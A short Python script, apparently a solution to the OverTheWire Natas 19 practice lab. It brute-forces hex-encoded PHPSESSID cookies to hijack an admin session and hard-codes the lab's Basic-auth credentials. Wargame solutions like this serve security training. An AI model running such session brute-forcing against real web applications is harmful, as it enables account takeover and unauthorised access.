import requests

header = {
    "Authorization": "Basic bmF0YXMxOTp0bndFUjdQZGZXa3hzRzRGTldVdG9BWjlWeVpUSnFKcg==",
    "Content-Type": "application/x-www-form-urlencoded"
}
url = "http://natas19.natas.labs.overthewire.org/"

phpsessid = "3X3X3X2d61646d696e"
intcounter = 000

while True:
    strcounter = str(intcounter).zfill(3)
    print(strcounter)
    cookie = {"PHPSESSID": phpsessid[0] + strcounter[0] + phpsessid[2] + strcounter[1] + phpsessid[4] + strcounter[2] + phpsessid[6:]}
    response = requests.post(url, headers=header, data={"username": "admin", "password": "admin"}, cookies=cookie)
        
    if "You are an admin" in response.text:
        print(response.text)
        break
    
    intcounter += 1
